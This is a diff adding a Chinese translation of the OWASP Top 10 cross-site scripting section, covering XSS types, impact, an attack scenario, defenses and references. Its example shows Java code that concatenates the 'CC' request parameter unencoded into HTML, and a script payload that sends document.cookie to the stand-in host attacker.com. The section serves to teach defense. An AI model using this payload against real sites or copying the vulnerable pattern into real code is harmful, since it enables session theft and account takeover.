@@ -467,7 +467,73 @@ For additional requirements in this area, see the Application Security Verificat
 
 > 当在新的页面打开应用程序，如果包含了没有经过适当的验证或编码的不可信数据，或者使用可以创建 HTML 或 JavaScript 的浏览器 API 更新现有的网页时，就可能会发生跨站脚本攻击。 XSS 让攻击者能够在受害者的浏览器中执行脚本，并劫持用户会话、破坏网站或者将用户重定向至恶意站点。
 
+#### 威胁来源、弱点以及影响
 
+自动化工具能够发现和利用这三种 XSS 类型，并且存在方便攻击者利用漏洞的框架。
+
+XSS 是 Top 10 中排名第二的最流行的漏洞，而且可以在三分之二的应用中发现。自动化工具能够自动找出一些 XSS 问题，尤其是成熟的技术中，例如 PHP / J2EE / JSP 和 ASP.NET。
+
+XSS 对于反射和 DOM 的影响是中等的，而对于存储的 XSS，其影响更加严重，例如在受攻击者的浏览器上执行远程代码，可以窃取凭证和会话或者传递恶意软件等。
+
+#### 你的应用时脆弱的吗？
+
+有三种常见的 XSS 类型，一般目标都是用户的浏览器：
+
+* **反射式 XSS**：应用或者 API 包含未经验证和未编码的用户输入来输出至 HTML。一次成功的攻击可以允许攻击者在受害者的浏览器中执行任意的 HTML 和 JavaScript。典型场景是用户点击了一些恶意的链接，指向了一个攻击者控制着的页面，例如恶意网站、广告或者类似的页面。
+* **存储式 XSS**：应用程序或者 API 存储了没有经过加密处理的用户输入，之后被另一个用户或者管理员看到了。存储式 XSS 一般导致更危险和严重的风险。
+* **DOM XSS**：JavaScript 框架，单页应用，以及 APIs 动态在某个有 DOM XSS 漏洞的页面包含了攻击者控制着的数据。理想状态下，应用程序不应该发送受攻击者控制的数据至不安全的 JavaScript APIs。
+
+典型的 XSS 攻击一般是窃取会话凭证、接管账户、绕过 MFA、替换或破坏 DOM 节点（例如伪造木马登录界面） ，攻击者对用户的浏览器的攻击，比如恶意软件下载、关键日志记录和其他客户端攻击。
+
+#### 攻击案例场景
+
+**例子一**：应用程序使用不可信的数据，在没有验证和编码的情况下，插入了下面这种 HTML 结构中：
+
+```javascript
+(String) page += "<input name='creditcard' type='TEXT'
+value='" + request.getParameter("CC") + "'>";
+```
+
+攻击者可以在浏览器中将 `CC` 参数的值修改为下面这样：
+
+```javascript
+'><script>document.location=
+'http://www.attacker.com/cgi-bin/cookie.cgi?
+foo='+document.cookie</script>'.
+```
+
+这个攻击导致了受害者的会话 ID 发送给了攻击者的网站，允许攻击者伪装成用户现在的会话。
+
+**注意**：攻击者同样能使用跨站脚本攻破应用程序可能使用的任何跨站请求伪造 CSRF 防御机制。
+
+#### 如何防御
+
+阻止 XSS 攻击需要将不可信数据与动态的浏览器内容区分开。这可以通过以下几点来实现：
+
+* 使用框架来从设计上自动防御 XSS，例如最新版的 Ruby，React JS。了解每个框架对于防御 XSS 的局限性以及适当的对未覆盖到的问题添加使用实例。
+* 远离基于不可信 HTTP 请求的数据输出在 HTML 上下文中（主体、属性、JavaScript、CSS 或 URL），这可以有效预防**反射式**和**存储式** XSS 漏洞。 [OWASP Cheat Sheet 'XSS Prevention'](https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet) 中有请求数据防御技术的详细内容。
+* 当在客户端修改浏览器文档时，应用上下文相关的编码可以抵御 DOM XSS 漏洞。如果不能避免的话，类似的上下文相关的编码技术可以被应用在浏览器 APIs 中，详见：[OWASP Cheat Sheet 'DOM based XSS Prevention'](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)。
+* 启用 [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) 可以作为一种深度防御策略来抵御 XSS 攻击。如果不存在可以通过本地文件放置恶意代码的其他漏洞（例如：路径便利覆盖和允许在网络中传输易受攻击的库），则该策略是有效的。
+
+#### 参考资料
+
+**OWASP**
+
+- [OWASP Proactive Controls: Encode Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab.3DOWASP_Proactive_Controls_2016)
+- [OWASP Proactive Controls: Validate Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab.3DOWASP_Proactive_Controls_2016)
+- [OWASP Application Security Verification Standard: V5](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project)
+- [OWASP Testing Guide: Testing for Reflected XSS](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_%28OTG-INPVAL-001%29)
+- [OWASP Testing Guide: Testing for Stored XSS](https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_%28OTG-INPVAL-002%29)
+- [OWASP Testing Guide: Testing for DOM XSS](https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_%28OTG-CLIENT-001%29)
+- [OWASP Cheat Sheet: XSS Prevention](https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet)
+- [OWASP Cheat Sheet: DOM based XSS Prevention](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)
+- [OWASP Cheat Sheet: XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
+- [OWASP Java Encoder Project](https://www.owasp.org/index.php/OWASP_Java_Encoder_Project)
+
+**External**
+
+- [CWE-79: Improper neutralization of user supplied input](https://cwe.mitre.org/data/definitions/79.html)
+- [PortSwigger: Client-side template injection](https://portswigger.net/kb/issues/00200308_clientsidetemplateinjection)
 
 ## A9-使用含有已知漏洞的组件-Using-Components-with-Known-Vulnerabilities
 
